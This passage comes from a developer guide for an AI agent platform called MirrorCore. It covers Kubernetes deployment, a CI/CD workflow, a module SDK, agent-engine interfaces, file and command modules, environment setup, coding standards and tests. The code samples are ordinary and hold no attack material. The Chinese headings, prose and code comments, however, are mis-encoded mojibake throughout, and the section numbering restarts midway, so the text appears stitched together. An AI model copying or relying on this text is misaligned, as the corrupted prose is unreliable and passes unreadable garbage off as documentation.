  name: mirrorcore-api
  labels:
    app: mirrorcore-api
spec:
  replicas: 3
  selector:
    matchLabels:
      app: mirrorcore-api
  template:
    metadata:
      labels:
        app: mirrorcore-api
    spec:
      containers:
      - name: mirrorcore-api
        image: mirrorcore/api:latest
        ports:
        - containerPort: 3000
        env:
        - name: NODE_ENV
          value: "production"
        - name: REDIS_URL
          valueFrom:
            secretKeyRef:
              name: mirrorcore-secrets
              key: redis-url
        - name: MONGODB_URL
          valueFrom:
            secretKeyRef:
              name: mirrorcore-secrets
              key: mongodb-url
        resources:
          requests:
            memory: "512Mi"
            cpu: "250m"
          limits:
            memory: "1Gi"
            cpu: "500m"
        livenessProbe:
          httpGet:
            path: /health
            port: 3000
          initialDelaySeconds: 30
          periodSeconds: 10
        readinessProbe:
          httpGet:
            path: /ready
            port: 3000
          initialDelaySeconds: 5
          periodSeconds: 5

---
apiVersion: v1
kind: Service
metadata:
  name: mirrorcore-api-service
spec:
  selector:
    app: mirrorcore-api
  ports:
  - protocol: TCP
    port: 80
    targetPort: 3000
  type: LoadBalancer
```

#### 3. CI/CDæµæ°´çº¿

```yaml
# .github/workflows/deploy.yml
name: Deploy MirrorCore

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    
    - name: Setup Node.js
      uses: actions/setup-node@v3
      with:
        node-version: '18'
        cache: 'npm'
    
    - name: Install dependencies
      run: npm ci
    
    - name: Run tests
      run: npm run test:ci
    
    - name: Run integration tests
      run: npm run test:integration
    
    - name: Run security scan
      run: npm audit --audit-level high

  build:
    needs: test
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Build Docker image
      run: |
        docker build -t mirrorcore/api:${{ github.sha }} .
        docker tag mirrorcore/api:${{ github.sha }} mirrorcore/api:latest
    
    - name: Push to registry
      run: |
        echo ${{ secrets.DOCKER_PASSWORD }} | docker login -u ${{ secrets.DOCKER_USERNAME }} --password-stdin
        docker push mirrorcore/api:${{ github.sha }}
        docker push mirrorcore/api:latest

  deploy:
    needs: build
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    
    steps:
    - name: Deploy to Kubernetes
      run: |
        kubectl set image deployment/mirrorcore-api mirrorcore-api=mirrorcore/api:${{ github.sha }}
        kubectl rollout status deployment/mirrorcore-api
```

---

## ğŸ¤ è´¡çŒ®æŒ‡å—

### æ¨¡å—å¼€å‘è´¡çŒ®

#### 1. å¼€å‘ç¯å¢ƒå‡†å¤‡

```bash
# å…‹éš†é¡¹ç›®
git clone https://github.com/your-org/mirrorcore.git
cd mirrorcore

# å®‰è£…ä¾èµ–
npm install

# åˆ›å»ºæ¨¡å—å¼€å‘åˆ†æ”¯
git checkout -b feature/new-module-name

# å¯åŠ¨å¼€å‘ç¯å¢ƒ
npm run dev:module-development
```

#### 2. æ¨¡å—å¼€å‘è§„èŒƒ

```typescript
// æ¨¡å—å¼€å‘æ¨¡æ¿
import { BaseModule, ModuleConfig, ModuleAction, ModuleResult } from '@mirrorcore/module-sdk';

export class YourModule extends BaseModule {
  // æ¨¡å—åŸºæœ¬ä¿¡æ¯
  id = 'your-module-id';
  name = 'Your Module Name';
  version = '1.0.0';
  description = 'Description of what your module does';
  
  // æ¨¡å—èƒ½åŠ›å®šä¹‰
  capabilities = [
    {
      id: 'your-capability',
      name: 'Your Capability Name',
      description: 'What this capability does',
      intentPatterns: [
        'pattern1',
        'pattern2'
      ],
      inputSchema: {
        type: 'object',
        properties: {
          // å®šä¹‰è¾“å…¥å‚æ•°
        },
        required: ['requiredParam']
      },
      outputSchema: {
        type: 'object',
        properties: {
          // å®šä¹‰è¾“å‡ºæ ¼å¼
        }
      }
    }
  ];
  
  // åˆå§‹åŒ–æ–¹æ³•
  protected async onInitialize(): Promise<void> {
    // æ¨¡å—åˆå§‹åŒ–é€»è¾‘
  }
  
  // æ‰§è¡Œæ–¹æ³•
  protected async onExecute(action: ModuleAction): Promise<ModuleResult> {
    switch (action.capability) {
      case 'your-capability':
        return await this.handleYourCapability(action.parameters);
      default:
        throw new Error(`Unknown capability: ${action.capability}`);
    }
  }
  
  private async handleYourCapability(params: any): Promise<ModuleResult> {
    // å®ç°å…·ä½“åŠŸèƒ½
    return {
      success: true,
      data: {
        // è¿”å›ç»“æœ
      }
    };
  }
}
```

#### 3. ä»£ç è´¨é‡è¦æ±‚

```typescript
// ä»£ç è§„èŒƒæ£€æŸ¥é…ç½®
// .eslintrc.js
module.exports = {
  extends: ['@mirrorcore/eslint-config'],
  rules: {
    // æ¨¡å—ç‰¹å®šè§„åˆ™
    'no-console': 'error',
    'prefer-const': 'error',
    '@typescript-eslint/no-unused-vars': 'error',
    '@typescript-eslint/explicit-function-return-type': 'warn'
  }
};

// æµ‹è¯•è¦†ç›–ç‡è¦æ±‚
// jest.config.js
module.exports = {
  coverageThreshold: {
    global: {
      branches: 80,
      functions: 80,
      lines: 80,
      statements: 80
    }
  }
};
```

#### 4. æäº¤æµç¨‹

```bash
# 1. è¿è¡Œæµ‹è¯•
npm run test
npm run test:integration
npm run test:security

# 2. ä»£ç è´¨é‡æ£€æŸ¥
npm run lint
npm run type-check
npm run security-scan

# 3. æ„å»ºæ£€æŸ¥
npm run build

# 4. æäº¤ä»£ç 
git add .
git commit -m "feat: add new module for [åŠŸèƒ½æè¿°]"

# 5. æ¨é€å¹¶åˆ›å»ºPR
git push origin feature/new-module-name
# åœ¨GitHubä¸Šåˆ›å»ºPull Request
```

### æ‰©å±•å•†åº—è´¡çŒ®

#### 1. æ¨¡å—å‘å¸ƒæµç¨‹

```bash
# 1. å‡†å¤‡æ¨¡å—åŒ…
npm run package:module

# 2. æ¨¡å—éªŒè¯
npm run validate:module

# 3. å®‰å…¨æ‰«æ
npm run security:scan

# 4. å‘å¸ƒåˆ°å•†åº—
npm run publish:store
```

#### 2. æ¨¡å—è´¨é‡æ ‡å‡†

- **åŠŸèƒ½å®Œæ•´æ€§**: æ‰€æœ‰å£°æ˜çš„èƒ½åŠ›éƒ½å¿…é¡»æ­£ç¡®å®ç°
- **é”™è¯¯å¤„ç†**: ä¼˜é›…å¤„ç†æ‰€æœ‰å¯èƒ½çš„é”™è¯¯æƒ…å†µ
- **æ€§èƒ½è¦æ±‚**: å“åº”æ—¶é—´ < 5ç§’ï¼Œå†…å­˜ä½¿ç”¨ < 100MB
- **å®‰å…¨æ ‡å‡†**: é€šè¿‡æ‰€æœ‰å®‰å…¨æ‰«æï¼Œæ— å·²çŸ¥æ¼æ´
- **æ–‡æ¡£å®Œæ•´**: åŒ…å«å®Œæ•´çš„APIæ–‡æ¡£å’Œä½¿ç”¨ç¤ºä¾‹
- **æµ‹è¯•è¦†ç›–**: ä»£ç è¦†ç›–ç‡ > 80%

#### 3. ç¤¾åŒºå‚ä¸

- **é—®é¢˜åé¦ˆ**: é€šè¿‡GitHub IssuesæŠ¥å‘Šé—®é¢˜
- **åŠŸèƒ½å»ºè®®**: é€šè¿‡Discussionsæå‡ºæ–°åŠŸèƒ½å»ºè®®
- **ä»£ç è´¡çŒ®**: é€šè¿‡Pull Requestè´¡çŒ®ä»£ç 
- **æ–‡æ¡£æ”¹è¿›**: å¸®åŠ©æ”¹è¿›é¡¹ç›®æ–‡æ¡£
- **ç¤¾åŒºæ”¯æŒ**: åœ¨ç¤¾åŒºè®ºå›å¸®åŠ©å…¶ä»–å¼€å‘è€…

é€šè¿‡ä»¥ä¸Šå¼€å‘æŒ‡å—ï¼Œå¼€å‘è€…å¯ä»¥æ·±å…¥ç†è§£MirrorCoreçš„æ™ºèƒ½æ¨¡å—åŒ–æ¶æ„ï¼Œå¹¶å‚ä¸åˆ°è¿™ä¸ªé©å‘½æ€§çš„AIä»£ç†ç³»ç»Ÿçš„å»ºè®¾ä¸­æ¥ã€‚

### 1. AIæ™ºèƒ½ä½“å¼•æ“ (Agent Engine)

#### æ¶æ„è®¾è®¡

```typescript
// æ™ºèƒ½ä½“æ ¸å¿ƒæ¥å£
interface AIAgent {
  // è‡ªç„¶è¯­è¨€ç†è§£
  understand(input: string, context: AgentContext): Promise<Intent>;
  
  // ä»»åŠ¡è§„åˆ’
  plan(intent: Intent, capabilities: Capability[]): Promise<TaskPlan>;
  
  // ä»»åŠ¡æ‰§è¡Œ
  execute(plan: TaskPlan): Promise<ExecutionResult>;
  
  // å­¦ä¹ ä¼˜åŒ–
  learn(feedback: Feedback): Promise<void>;
}

// æ™ºèƒ½ä½“ä¸Šä¸‹æ–‡
interface AgentContext {
  userId: string;
  sessionId: string;
  projectPath?: string;
  currentFile?: string;
  history: Message[];
  preferences: UserPreferences;
}

// æ„å›¾è¯†åˆ«ç»“æœ
interface Intent {
  type: IntentType;
  confidence: number;
  parameters: Record<string, any>;
  requiredCapabilities: string[];
}

// ä»»åŠ¡è®¡åˆ’
interface TaskPlan {
  id: string;
  steps: TaskStep[];
  estimatedDuration: number;
  dependencies: string[];
  rollbackPlan?: TaskStep[];
}
```

#### æ ¸å¿ƒç»„ä»¶

1. **è‡ªç„¶è¯­è¨€å¤„ç†å™¨ (NLP Processor)**
   ```typescript
   class NLPProcessor {
     async parseIntent(text: string): Promise<Intent> {
       // ä½¿ç”¨AIæ¨¡å‹è§£æç”¨æˆ·æ„å›¾
       const response = await this.aiService.complete({
         messages: [
           { role: 'system', content: INTENT_CLASSIFICATION_PROMPT },
           { role: 'user', content: text }
         ]
       });
       
       return this.parseIntentFromResponse(response);
     }
   }
   ```

2. **ä»»åŠ¡è§„åˆ’å™¨ (Task Planner)**
   ```typescript
   class TaskPlanner {
     async createPlan(intent: Intent, context: AgentContext): Promise<TaskPlan> {
       const availableModules = await this.moduleRegistry.getAvailableModules();
       const plan = await this.generateExecutionPlan(intent, availableModules, context);
       
       return this.optimizePlan(plan);
     }
   }
   ```

3. **æ‰§è¡Œå¼•æ“ (Execution Engine)**
   ```typescript
   class ExecutionEngine {
     async executePlan(plan: TaskPlan): Promise<ExecutionResult> {
       const results: StepResult[] = [];
       
       for (const step of plan.steps) {
         try {
           const result = await this.executeStep(step);
           results.push(result);
           
           if (!result.success && step.critical) {
             await this.rollback(results);
             throw new ExecutionError(`Critical step failed: ${step.id}`);
           }
         } catch (error) {
           await this.handleStepError(step, error);
         }
       }
       
       return { success: true, results };
     }
   }
   ```

### 2. æ¨¡å—æ³¨å†Œç³»ç»Ÿ (Module Registry)

#### æ¨¡å—æ¥å£å®šä¹‰

```typescript
// åŸºç¡€æ¨¡å—æ¥å£
interface Module {
  id: string;
  name: string;
  version: string;
  description: string;
  capabilities: Capability[];
  dependencies: string[];
  
  // ç”Ÿå‘½å‘¨æœŸæ–¹æ³•
  initialize(config: ModuleConfig): Promise<void>;
  execute(action: ModuleAction): Promise<ModuleResult>;
  cleanup(): Promise<void>;
  
  // å¥åº·æ£€æŸ¥
  healthCheck(): Promise<HealthStatus>;
}

// æ¨¡å—èƒ½åŠ›å®šä¹‰
interface Capability {
  id: string;
  name: string;
  description: string;
  inputSchema: JSONSchema;
  outputSchema: JSONSchema;
  examples: CapabilityExample[];
}

// æ¨¡å—åŠ¨ä½œ
interface ModuleAction {
  capability: string;
  parameters: Record<string, any>;
  context: ExecutionContext;
}
```

#### æ¨¡å—æ³¨å†Œå™¨

```typescript
class ModuleRegistry {
  private modules = new Map<string, Module>();
  private capabilities = new Map<string, Capability>();
  
  async registerModule(module: Module): Promise<void> {
    // éªŒè¯æ¨¡å—
    await this.validateModule(module);
    
    // æ£€æŸ¥ä¾èµ–
    await this.checkDependencies(module.dependencies);
    
    // åˆå§‹åŒ–æ¨¡å—
    await module.initialize(this.getModuleConfig(module.id));
    
    // æ³¨å†Œæ¨¡å—å’Œèƒ½åŠ›
    this.modules.set(module.id, module);
    module.capabilities.forEach(cap => {
      this.capabilities.set(cap.id, cap);
    });
    
    this.logger.info(`Module registered: ${module.id}@${module.version}`);
  }
  
  async executeCapability(capabilityId: string, parameters: any): Promise<any> {
    const capability = this.capabilities.get(capabilityId);
    if (!capability) {
      throw new Error(`Capability not found: ${capabilityId}`);
    }
    
    const module = this.findModuleByCapability(capabilityId);
    return await module.execute({
      capability: capabilityId,
      parameters,
      context: this.createExecutionContext()
    });
  }
}
```

### 3. ä»£ç åˆ†ææ¨¡å— (Code Analysis Module)

#### æ ¸å¿ƒåŠŸèƒ½

```typescript
class CodeAnalysisModule implements Module {
  id = 'code-analysis';
  name = 'Code Analysis Module';
  
  async analyzeProject(projectPath: string, options: AnalysisOptions): Promise<ProjectAnalysis> {
    const analyzer = new ProjectAnalyzer();
    
    // æ‰«æé¡¹ç›®ç»“æ„
    const structure = await analyzer.scanStructure(projectPath);
    
    // åˆ†æä»£ç è´¨é‡
    const quality = await analyzer.analyzeQuality(structure, options);
    
    // æ£€æµ‹å®‰å…¨é—®é¢˜
    const security = await analyzer.analyzeSecurity(structure);
    
    // æ€§èƒ½åˆ†æ
    const performance = await analyzer.analyzePerformance(structure);
    
    // ä¾èµ–åˆ†æ
    const dependencies = await analyzer.analyzeDependencies(structure);
    
    return {
      structure,
      quality,
      security,
      performance,
      dependencies,
      recommendations: await this.generateRecommendations({
        quality, security, performance, dependencies
      })
    };
  }
  
  async generateCode(request: CodeGenerationRequest): Promise<GeneratedCode> {
    const generator = new CodeGenerator();
    
    // åˆ†æéœ€æ±‚
    const requirements = await generator.analyzeRequirements(request);
    
    // ç”Ÿæˆä»£ç 
    const code = await generator.generateCode(requirements);
    
    // ä»£ç ä¼˜åŒ–
    const optimizedCode = await generator.optimizeCode(code);
    
    // ç”Ÿæˆæµ‹è¯•
    const tests = await generator.generateTests(optimizedCode);
    
    return {
      code: optimizedCode,
      tests,
      documentation: await generator.generateDocumentation(optimizedCode),
      usage: await generator.generateUsageExamples(optimizedCode)
    };
  }
}
```

### 4. é¡¹ç›®ç®¡ç†æ¨¡å— (Project Management Module)

#### ä»»åŠ¡ç®¡ç†ç³»ç»Ÿ

```typescript
class ProjectManagementModule implements Module {
  id = 'project-management';
  name = 'Project Management Module';
  
  async createTask(taskData: CreateTaskRequest): Promise<Task> {
    // ä»»åŠ¡åˆ†æå’Œåˆ†è§£
    const analyzer = new TaskAnalyzer();
    const analysis = await analyzer.analyzeTask(taskData);
    
    // åˆ›å»ºä»»åŠ¡
    const task = await this.taskRepository.create({
      ...taskData,
      estimatedHours: analysis.estimatedHours,
      complexity: analysis.complexity,
      subtasks: analysis.subtasks,
      dependencies: analysis.dependencies
    });
    
    // ç”Ÿæˆé¡¹ç›®æ–‡ä»¶
    if (taskData.generateFiles) {
      await this.generateTaskFiles(task);
    }
    
    // å‘é€é€šçŸ¥
    await this.notificationService.notifyTaskCreated(task);
    
    return task;
  }
  
  async trackProgress(taskId: string): Promise<TaskProgress> {
    const task = await this.taskRepository.findById(taskId);
    const progress = await this.progressTracker.calculateProgress(task);
    
    // æ›´æ–°è¿›åº¦
    await this.taskRepository.updateProgress(taskId, progress);
    
    // æ£€æŸ¥é‡Œç¨‹ç¢‘
    await this.checkMilestones(task, progress);
    
    return progress;
  }
}
```

### 5. æ–‡ä»¶æ“ä½œæ¨¡å— (File Operations Module)

#### å®‰å…¨æ–‡ä»¶æ“ä½œ

```typescript
class FileOperationsModule implements Module {
  id = 'file-operations';
  name = 'File Operations Module';
  
  private securityManager = new FileSecurityManager();
  
  async createFile(path: string, content: string, options: CreateFileOptions): Promise<FileResult> {
    // å®‰å…¨æ£€æŸ¥
    await this.securityManager.validatePath(path);
    await this.securityManager.checkPermissions(path, 'write');
    
    // å¤‡ä»½ç°æœ‰æ–‡ä»¶
    if (options.backup && await this.exists(path)) {
      await this.createBackup(path);
    }
    
    // åˆ›å»ºç›®å½•
    if (options.createDirectories) {
      await this.ensureDirectories(dirname(path));
    }
    
    // å†™å…¥æ–‡ä»¶
    await fs.writeFile(path, content, { encoding: options.encoding || 'utf8' });
    
    // è®°å½•æ“ä½œæ—¥å¿—
    await this.auditLogger.logFileOperation('create', path, {
      size: content.length,
      encoding: options.encoding
    });
    
    return { success: true, path, size: content.length };
  }
  
  async searchFiles(query: SearchQuery): Promise<SearchResult[]> {
    const searcher = new FileSearcher();
    
    // æ„å»ºæœç´¢ç´¢å¼•
    const index = await searcher.buildIndex(query.path, {
      fileTypes: query.fileTypes,
      excludePatterns: query.excludePatterns
    });
    
    // æ‰§è¡Œæœç´¢
    const results = await searcher.search(index, query.pattern, {
      caseSensitive: query.caseSensitive,
      regex: query.regex,
      maxResults: query.maxResults
    });
    
    return results;
  }
}
```

### 6. å‘½ä»¤æ‰§è¡Œæ¨¡å— (Command Execution Module)

#### å®‰å…¨å‘½ä»¤æ‰§è¡Œ

```typescript
class CommandExecutionModule implements Module {
  id = 'command-execution';
  name = 'Command Execution Module';
  
  private commandValidator = new CommandValidator();
  private processManager = new ProcessManager();
  
  async executeCommand(command: string, options: ExecutionOptions): Promise<ExecutionResult> {
    // å‘½ä»¤å®‰å…¨éªŒè¯
    await this.commandValidator.validate(command);
    
    // åˆ›å»ºæ‰§è¡Œç¯å¢ƒ
    const environment = await this.createSecureEnvironment(options);
    
    // æ‰§è¡Œå‘½ä»¤
    const process = await this.processManager.spawn(command, {
      cwd: options.workingDirectory,
      env: environment,
      timeout: options.timeout || 30000,
      shell: options.shell
    });
    
    // ç›‘æ§æ‰§è¡Œ
    const monitor = new ExecutionMonitor(process);
    monitor.on('output', (data) => this.handleOutput(data));
    monitor.on('error', (error) => this.handleError(error));
    
    // ç­‰å¾…å®Œæˆ
    const result = await process.wait();
    
    // è®°å½•æ‰§è¡Œæ—¥å¿—
    await this.auditLogger.logCommandExecution(command, result);
    
    return result;
  }
  
  async createScript(scriptData: CreateScriptRequest): Promise<Script> {
    const script = await this.scriptRepository.create({
      ...scriptData,
      hash: await this.calculateScriptHash(scriptData.commands),
      createdAt: new Date()
    });
    
    // éªŒè¯è„šæœ¬å®‰å…¨æ€§
    await this.validateScriptSecurity(script);
    
    return script;
  }
}
```

---

## ğŸ”§ å¼€å‘ç¯å¢ƒé…ç½®

### ç¯å¢ƒè¦æ±‚

#### ç³»ç»Ÿè¦æ±‚
- **æ“ä½œç³»ç»Ÿ**: Windows 10+, macOS 10.15+, Ubuntu 18.04+
- **Node.js**: 18.0.0 æˆ–æ›´é«˜ç‰ˆæœ¬
- **å†…å­˜**: æœ€å°‘ 8GB RAM (æ¨è 16GB+)
- **å­˜å‚¨**: æœ€å°‘ 10GB å¯ç”¨ç©ºé—´
- **ç½‘ç»œ**: ç¨³å®šçš„äº’è”ç½‘è¿æ¥ (ç”¨äºAIæœåŠ¡è°ƒç”¨)

#### å¿…éœ€è½¯ä»¶
```bash
# Node.js å’Œ npm
node --version  # >= 18.0.0
npm --version   # >= 8.0.0

# Git
git --version   # >= 2.30.0

# Docker (å¯é€‰ï¼Œç”¨äºå®¹å™¨åŒ–å¼€å‘)
docker --version   # >= 20.10.0
docker-compose --version  # >= 1.29.0
```

### å¼€å‘ç¯å¢ƒæ­å»º

#### 1. å…‹éš†é¡¹ç›®

```bash
# å…‹éš†ä¸»ä»“åº“
git clone https://github.com/your-org/mirrorcore.git
cd mirrorcore

# å®‰è£…ä¾èµ–
npm install

# å®‰è£…å¼€å‘å·¥å…·
npm install -g typescript ts-node nodemon
```

#### 2. ç¯å¢ƒé…ç½®

```bash
# å¤åˆ¶ç¯å¢ƒé…ç½®æ–‡ä»¶
cp .env.example .env.development

# ç¼–è¾‘é…ç½®æ–‡ä»¶
nano .env.development
```

**ç¯å¢ƒå˜é‡é…ç½®**:
```env
# åº”ç”¨é…ç½®
NODE_ENV=development
PORT=3000
LOG_LEVEL=debug

# AIæœåŠ¡é…ç½®
OPENAI_API_KEY=your_openai_api_key
ANTHROPIC_API_KEY=your_anthropic_api_key
AI_SERVICE_PROVIDER=openai  # openai | anthropic | custom

# æ•°æ®åº“é…ç½®
STORAGE_TYPE=file
STORAGE_PATH=./data/storage

# å®‰å…¨é…ç½®
JWT_SECRET=your_jwt_secret_key
ENCRYPTION_KEY=your_encryption_key

# æ–‡ä»¶ç³»ç»Ÿé…ç½®
WORKSPACE_ROOT=/path/to/workspace
MAX_FILE_SIZE=10485760  # 10MB
ALLOWED_FILE_TYPES=.js,.ts,.jsx,.tsx,.py,.java,.cpp,.go,.rs

# å¤–éƒ¨æœåŠ¡é…ç½®
GITHUB_TOKEN=your_github_token
AWS_ACCESS_KEY_ID=your_aws_access_key
AWS_SECRET_ACCESS_KEY=your_aws_secret_key
```

#### 3. æ•°æ®å­˜å‚¨è®¾ç½®

```bash
# åˆ›å»ºæ•°æ®ç›®å½•
mkdir -p data

# åˆå§‹åŒ–å­˜å‚¨
npm run storage:init
```

#### 4. å¯åŠ¨å¼€å‘æœåŠ¡å™¨

```bash
# å¯åŠ¨åç«¯æœåŠ¡
npm run dev:backend

# å¯åŠ¨å‰ç«¯å¼€å‘æœåŠ¡å™¨ (æ–°ç»ˆç«¯)
npm run dev:frontend

# å¯åŠ¨æ¡Œé¢åº”ç”¨ (æ–°ç»ˆç«¯)
npm run dev:desktop
```

### IDEé…ç½®

#### VS Code æ¨èé…ç½®

**æ‰©å±•æ’ä»¶**:
```json
{
  "recommendations": [
    "ms-vscode.vscode-typescript-next",
    "esbenp.prettier-vscode",
    "ms-vscode.vscode-eslint",
    "bradlc.vscode-tailwindcss",
    "ms-vscode.vscode-jest",
    "ms-playwright.playwright",
    "ms-vscode.vscode-json"
  ]
}
```

**å·¥ä½œåŒºè®¾ç½®**:
```json
{
  "typescript.preferences.importModuleSpecifier": "relative",
  "editor.formatOnSave": true,
  "editor.codeActionsOnSave": {
    "source.fixAll.eslint": true,
    "source.organizeImports": true
  },
  "files.exclude": {
    "**/node_modules": true,
    "**/dist": true,
    "**/.next": true
  }
}
```

---

## ğŸ“ ä»£ç è§„èŒƒ

### TypeScript ç¼–ç è§„èŒƒ

#### 1. å‘½åçº¦å®š

```typescript
// æ¥å£ä½¿ç”¨ PascalCaseï¼Œä»¥ I å¼€å¤´
interface IUserService {
  createUser(userData: CreateUserRequest): Promise<User>;
}

// ç±»ä½¿ç”¨ PascalCase
class UserService implements IUserService {
  private readonly userRepository: IUserRepository;
  
  constructor(userRepository: IUserRepository) {
    this.userRepository = userRepository;
  }
}

// å¸¸é‡ä½¿ç”¨ SCREAMING_SNAKE_CASE
const MAX_RETRY_ATTEMPTS = 3;
const DEFAULT_TIMEOUT = 5000;

// æšä¸¾ä½¿ç”¨ PascalCase
enum TaskStatus {
  Pending = 'pending',
  InProgress = 'in_progress',
  Completed = 'completed',
  Failed = 'failed'
}

// å‡½æ•°å’Œå˜é‡ä½¿ç”¨ camelCase
const calculateEstimatedTime = (tasks: Task[]): number => {
  return tasks.reduce((total, task) => total + task.estimatedHours, 0);
};
```

#### 2. ç±»å‹å®šä¹‰

```typescript
// ä½¿ç”¨ä¸¥æ ¼çš„ç±»å‹å®šä¹‰
interface CreateTaskRequest {
  readonly title: string;
  readonly description?: string;
  readonly priority: TaskPriority;
  readonly assigneeId?: string;
  readonly dueDate?: Date;
  readonly tags: readonly string[];
}

// ä½¿ç”¨è”åˆç±»å‹å’Œå­—é¢é‡ç±»å‹
type TaskPriority = 'low' | 'medium' | 'high' | 'urgent';
type HttpMethod = 'GET' | 'POST' | 'PUT' | 'DELETE' | 'PATCH';

// ä½¿ç”¨æ³›å‹æé«˜ä»£ç å¤ç”¨æ€§
interface Repository<T, K = string> {
  findById(id: K): Promise<T | null>;
  create(entity: Omit<T, 'id'>): Promise<T>;
  update(id: K, updates: Partial<T>): Promise<T>;
  delete(id: K): Promise<void>;
}

// ä½¿ç”¨æ¡ä»¶ç±»å‹
type ApiResponse<T> = T extends string 
  ? { message: T } 
  : { data: T; message: string };
```

#### 3. é”™è¯¯å¤„ç†

```typescript
// è‡ªå®šä¹‰é”™è¯¯ç±»
class ValidationError extends Error {
  constructor(
    message: string,
    public readonly field: string,
    public readonly code: string = 'VALIDATION_ERROR'
  ) {
    super(message);
    this.name = 'ValidationError';
  }
}

// ç»“æœç±»å‹æ¨¡å¼
type Result<T, E = Error> = 
  | { success: true; data: T }
  | { success: false; error: E };

// ä½¿ç”¨ Result ç±»å‹çš„å‡½æ•°
async function validateUser(userData: unknown): Promise<Result<User, ValidationError>> {
  try {
    const user = await userSchema.parseAsync(userData);
    return { success: true, data: user };
  } catch (error) {
    return { 
      success: false, 
      error: new ValidationError('Invalid user data', 'userData') 
    };
  }
}
```

### ESLint é…ç½®

```json
{
  "extends": [
    "@typescript-eslint/recommended",
    "@typescript-eslint/recommended-requiring-type-checking",
    "prettier"
  ],
  "rules": {
    "@typescript-eslint/no-unused-vars": "error",
    "@typescript-eslint/explicit-function-return-type": "warn",
    "@typescript-eslint/no-explicit-any": "warn",
    "@typescript-eslint/prefer-readonly": "error",
    "prefer-const": "error",
    "no-var": "error"
  }
}
```

### Prettier é…ç½®

```json
{
  "semi": true,
  "trailingComma": "es5",
  "singleQuote": true,
  "printWidth": 100,
  "tabWidth": 2,
  "useTabs": false
}
```

---

## ğŸ§ª æµ‹è¯•ç­–ç•¥

### æµ‹è¯•é‡‘å­—å¡”

```
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚   E2E Tests     â”‚  <- å°‘é‡ï¼Œå…³é”®ç”¨æˆ·æµç¨‹
    â”‚     (10%)       â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚ Integration     â”‚  <- ä¸­ç­‰æ•°é‡ï¼Œæ¨¡å—é—´äº¤äº’
    â”‚   Tests (30%)   â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  Unit Tests     â”‚  <- å¤§é‡ï¼Œå•ä¸ªå‡½æ•°/ç±»
    â”‚    (60%)        â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### å•å…ƒæµ‹è¯•

#### Jest é…ç½®

```typescript
// jest.config.js
module.exports = {
  preset: 'ts-jest',
  testEnvironment: 'node',
  roots: ['<rootDir>/src', '<rootDir>/tests'],
  testMatch: ['**/__tests__/**/*.test.ts', '**/?(*.)+(spec|test).ts'],
  collectCoverageFrom: [
    'src/**/*.ts',
    '!src/**/*.d.ts',
    '!src/types/**/*',
  ],
  coverageThreshold: {
    global: {
      branches: 80,
      functions: 80,
      lines: 80,
      statements: 80,
    },
  },
};
```

#### æµ‹è¯•ç¤ºä¾‹

```typescript
// tests/modules/code-analysis.test.ts
describe('CodeAnalysisModule', () => {
  let module: CodeAnalysisModule;
  let mockFileSystem: jest.Mocked<IFileSystem>;
  
  beforeEach(() => {
    mockFileSystem = createMockFileSystem();
    module = new CodeAnalysisModule(mockFileSystem);
  });
  
  describe('analyzeProject', () => {
    it('should analyze project structure correctly', async () => {
      // Arrange
      const projectPath = '/test/project';
      mockFileSystem.readDirectory.mockResolvedValue([
        'src/index.ts',
        'package.json',
        'README.md'
      ]);
      
      // Act
      const result = await module.analyzeProject(projectPath, {
        depth: 'shallow'
      });
      
      // Assert
      expect(result.structure.totalFiles).toBe(3);
      expect(result.structure.languages).toContain('typescript');
      expect(mockFileSystem.readDirectory).toHaveBeenCalledWith(projectPath);
    });
    
    it('should handle analysis errors gracefully', async () => {
      // Arrange
      const projectPath = '/invalid/path';
      mockFileSystem.readDirectory.mockRejectedValue(
        new Error('Directory not found')
      );
      
      // Act & Assert
      await expect(module.analyzeProject(projectPath, {}))
        .rejects.toThrow('Directory not found');
    });
  });
});
```

### é›†æˆæµ‹è¯•

```typescript
// tests/integration/api.test.ts
describe('API Integration Tests', () => {
  let app: Application;
  let testStorage: IContextStorage;
  
  beforeAll(async () => {
    testStorage = await createTestStorage();
    app = createApp({ storage: testStorage });
  });
  
  afterAll(async () => {
    await testStorage.cleanup();
  });
  
  describe('POST /api/chat/message', () => {
    it('should process chat message and return response', async () => {
      const response = await request(app)
        .post('/api/chat/message')
        .send({
          message: 'è¯·å¸®æˆ‘åˆ†æè¿™ä¸ªé¡¹ç›®',
          context: { projectPath: '/test/project' }
        })
        .expect(200);
      
      expect(response.body).toHaveProperty('response');
      expect(response.body).toHaveProperty('actions');
      expect(response.body.actions).toBeInstanceOf(Array);
    });
  });
});
```

### E2E æµ‹è¯•

```typescript
// tests/e2e/chat-workflow.spec.ts
import { test, expect } from '@playwright/test';

test.describe('Chat Workflow', () => {
  test('should complete full chat interaction', async ({ page }) => {
    // å¯¼èˆªåˆ°åº”ç”¨
    await page.goto('http://localhost:3000');
    
    // ç­‰å¾…åº”ç”¨åŠ è½½
    await expect(page.locator('[data-testid="chat-container"]')).toBeVisible();
    
    // å‘é€æ¶ˆæ¯
    const messageInput = page.locator('[data-testid="message-input"]');
    await messageInput.fill('è¯·å¸®æˆ‘åˆ›å»ºä¸€ä¸ªReactç»„ä»¶');
    await page.click('[data-testid="send-button"]');
    
    // éªŒè¯æ¶ˆæ¯å‘é€
    await expect(page.locator('.user-message').last()).toContainText('è¯·å¸®æˆ‘åˆ›å»ºä¸€ä¸ªReactç»„ä»¶');
    
    // ç­‰å¾…AIå“åº”
    await expect(page.locator('.assistant-message').last()).toBeVisible({ timeout: 10000 });
    
    // éªŒè¯å“åº”å†…å®¹
    const response = page.locator('.assistant-message').last();
    await expect(response).toContainText('Reactç»„ä»¶');
  });
});
```

---

## ğŸš€ éƒ¨ç½²æµç¨‹

### å¼€å‘ç¯å¢ƒéƒ¨ç½²

```bash
# æ„å»ºé¡¹ç›®
npm run build

